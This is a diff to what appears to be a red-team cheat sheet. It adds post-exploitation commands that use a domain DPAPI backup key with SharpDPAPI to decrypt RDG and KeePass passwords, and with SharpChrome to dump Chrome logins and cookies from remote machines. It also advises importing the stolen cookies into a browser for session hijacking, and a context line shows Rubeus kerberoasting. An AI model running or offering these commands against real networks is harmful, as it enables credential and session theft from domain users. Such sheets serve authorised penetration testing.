@@ -167,15 +167,22 @@ execute-assembly C:\Rubeus.exe kerberoast /outfile:KerbHash.txt /user:testaccoun
 ```
 # SharpDPAPI to retrieve domain DPAPI backup key and output to file which is used for subsequent attacks (requires DA privileges)
 execute-assembly SharpDPAPI.exe backupkey /file:key.pvk
+
+# Decrypt any RDG (remote desktop) passwords found using the domain backup key (can also use local Admin account or master key)
+execute-assembly SharpDPAPI.exe rdg /pvk:key.pvk /unprotect
+
+# Decrypt any KeePass passwords found using the domain backup key (can also use local Admin account or master key)
+execute-assembly SharpDPAPI.exe keepass /pvk:key.pvk /unprotect
 ```
 
 SharpChrome to extract and decrypt a user's Chrome sessions/passwords
 ```
-# Dumping Chrome login passwords on remote machines
+# Dumping Chrome login passwords on remote machines using the domain backup key (can also use local user password)
+execute-assembly SharpChrome.exe logins /pvk:key.pvk /server:SERVER.lab.local
 
-
-# Dumping and decryptiong Chrome user sessions on remote machines
-
+# Dumping and decryptiong Chrome user cookies and sessions on remote machines using the domain backup key (can also use local user password)
+# Cookies can then be imported into Chrome/Firefox using the extension Cookie-Editor
+execute-assembly SharpChrome.exe cookies /pvk:key.pvk /server:SERVER.lab.local /format:json
 ```
 
 ------------------------------------------------------------------------------------------
